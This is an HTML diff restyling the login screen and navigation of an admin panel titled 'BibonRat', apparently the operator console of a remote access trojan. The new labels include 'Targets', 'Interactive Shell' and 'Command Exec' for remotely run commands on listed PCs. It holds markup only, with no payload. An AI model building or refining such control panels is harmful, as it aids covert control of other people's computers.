@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BibonRat — Admin Panel</title>
+    <title>⚡ CYBER CONTROL PANEL ⚡</title>
     <link rel="stylesheet" href="./style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⚡</text></svg>">
 </head>
 <body>
 
@@ -13,17 +14,17 @@
     <div id="authScreen" class="centerWrap">
         <div class="authCard">
             <div class="authTitle">
-                <div class="brand"><span class="dot"></span> BibonRat Admin</div>
-                <span class="badge">Mobile v2.0</span>
+                <div class="brand"><span class="dot"></span> CYBER TERMINAL</div>
+                <span class="badge">MATRIX v3.0</span>
             </div>
-            <div class="muted">Вход/регистрация через Email + Password</div>
+            <div class="muted">&gt; SYSTEM ACCESS CONTROL &lt;</div>
             <div class="stack">
-                <input id="email" type="email" placeholder="Email" autocomplete="email">
-                <input id="password" type="password" placeholder="Password" autocomplete="current-password">
+                <input id="email" type="email" placeholder="[ENTER ACCESS CODE]" autocomplete="email">
+                <input id="password" type="password" placeholder="[SECURITY KEY]" autocomplete="current-password">
             </div>
             <div class="row">
-                <button id="btnLogin" class="btnPrimary">Войти</button>
-                <button id="btnRegister">Регистрация</button>
+                <button id="btnLogin" class="btnPrimary"><i class="fas fa-unlock"></i> LOGIN</button>
+                <button id="btnRegister"><i class="fas fa-user-plus"></i> REGISTER</button>
             </div>
             <div id="authError" class="err"></div>
         </div>
@@ -31,37 +32,66 @@
 
     <!-- APP SCREEN -->
     <div id="appScreen" class="app hidden">
-        <!-- MENU BAR -->
-        <div class="menuBar">
-            <div class="menuItem active" data-page="pcList">
-                <i class="fas fa-list"></i>
-                PC List
-                <span id="pcCountBadge" class="badge">0</span>
-            </div>
-            <div class="menuItem" data-page="pcInfo">
-                <i class="fas fa-info-circle"></i>
-                PC Info
-                <span id="selectedPcBadge" class="badge">—</span>
-            </div>
-            <div class="menuItem" data-page="chat">
-                <i class="fas fa-comments"></i>
-                Chat
-                <span id="chatBadge" class="badge">OFF</span>
-            </div>
-            <div class="menuItem" data-page="command">
-                <i class="fas fa-terminal"></i>
-                Command
-                <span id="cmdBadge" class="badge">—</span>
-            </div>
-            <div class="menuItem" data-page="folders">
-                <i class="fas fa-folder-tree"></i>
-                Folders
-                <span id="foldersBadge" class="badge">0</span>
+        <!-- SIDEBAR MENU -->
+        <div class="sidebar">
+            <div class="sidebarHeader">
+                <div class="sidebarLogo">
+                    <span class="dot"></span>
+                    <span class="logoText">CYBER</span>
+                </div>
+                <button id="sidebarToggle" class="sidebarToggleBtn">
+                    <i class="fas fa-bars"></i>
+                </button>
             </div>
 
-            <div class="menuRight">
-                <span id="meEmail" class="badge">user@email.com</span>
-                <button id="btnLogout" style="min-height: 36px;">Выйти</button>
+            <div class="sidebarMenu">
+                <div class="menuSection">
+                    <div class="menuSectionTitle">NAVIGATION</div>
+                    <div class="menuItem active" data-page="pcList">
+                        <i class="fas fa-server"></i>
+                        <span class="menuText">Targets</span>
+                        <span id="pcCountBadge" class="badge">0</span>
+                    </div>
+                    <div class="menuItem" data-page="pcInfo">
+                        <i class="fas fa-microchip"></i>
+                        <span class="menuText">System Info</span>
+                        <span id="selectedPcBadge" class="badge">—</span>
+                    </div>
+                    <div class="menuItem" data-page="chat">
+                        <i class="fas fa-terminal"></i>
+                        <span class="menuText">Interactive Shell</span>
+                        <span id="chatBadge" class="badge">OFF</span>
+                    </div>
+                    <div class="menuItem" data-page="command">
+                        <i class="fas fa-code"></i>
+                        <span class="menuText">Command Exec</span>
+                        <span id="cmdBadge" class="badge">—</span>
+                    </div>
+                    <div class="menuItem" data-page="folders">
+                        <i class="fas fa-sitemap"></i>
+                        <span class="menuText">Groups</span>
+                        <span id="foldersBadge" class="badge">0</span>
+                    </div>
+                </div>
+
+                <div class="menuSection">
+                    <div class="menuSectionTitle">SYSTEM</div>
+                    <div class="menuItemStatic">
+                        <i class="fas fa-user-circle"></i>
+                        <span class="menuText" id="meEmail">user@system</span>
+                    </div>
+                    <div class="menuItemStatic" id="statusIndicator">
+                        <i class="fas fa-circle statusDot"></i>
+                        <span class="menuText">Online</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="sidebarFooter">
+                <button id="btnLogout" class="logoutBtn">
+                    <i class="fas fa-power-off"></i>
+                    <span class="menuText">Disconnect</span>
+                </button>
             </div>
         </div>
 
@@ -71,17 +101,17 @@
             <div id="pcListSection" class="contentSection">
                 <div class="panel">
                     <div class="panelHeader">
-                        <div class="title">Список клиентов</div>
+                        <div class="title"><i class="fas fa-server"></i> Target List</div>
                         <div class="row">
-                            <button id="btnSelectMode"><i class="fas fa-check-square"></i> Выбрать</button>
-                            <button id="btnPingAll">Пинг всем</button>
-                            <button id="btnRefresh">Обновить</button>
+                            <button id="btnSelectMode" title="Select multiple targets"><i class="fas fa-check-square"></i> Select</button>
+                            <button id="btnPingAll" title="Ping all targets"><i class="fas fa-satellite-dish"></i> Ping All</button>
+                            <button id="btnRefresh" title="Refresh list"><i class="fas fa-sync-alt"></i> Refresh</button>
                         </div>
                     </div>
 
                     <div class="listTop">
                         <div class="row spaceBetween">
-                            <div class="muted">Коллекция: <b>pcList</b></div>
+                            <div class="muted">> COLLECTION: <b>pcList</b></div>
                             <div class="row">
                                 <span id="pingAllStatus" class="badge">—</span>
                             </div>
@@ -90,15 +120,15 @@
                         <div class="statsRow">
                             <div class="statCard">
                                 <div class="statValue" id="totalClients">0</div>
-                                <div class="statLabel">Всего</div>
+                                <div class="statLabel"><i class="fas fa-database"></i> Total</div>
                             </div>
                             <div class="statCard">
                                 <div class="statValue" id="onlineClients">0</div>
-                                <div class="statLabel">Онлайн</div>
+                                <div class="statLabel"><i class="fas fa-circle"></i> Online</div>
                             </div>
                             <div class="statCard">
                                 <div class="statValue" id="offlineClients">0</div>
-                                <div class="statLabel">Оффлайн</div>
+                                <div class="statLabel"><i class="fas fa-circle-notch"></i> Offline</div>
                             </div>
                         </div>
 
@@ -308,6 +338,8 @@
             </div>
         </div>
     </div>
+
+    <!-- Mobile Menu Button (added dynamically via JS) -->
 
     <script type="module" src="./main.js"></script>
 </body>
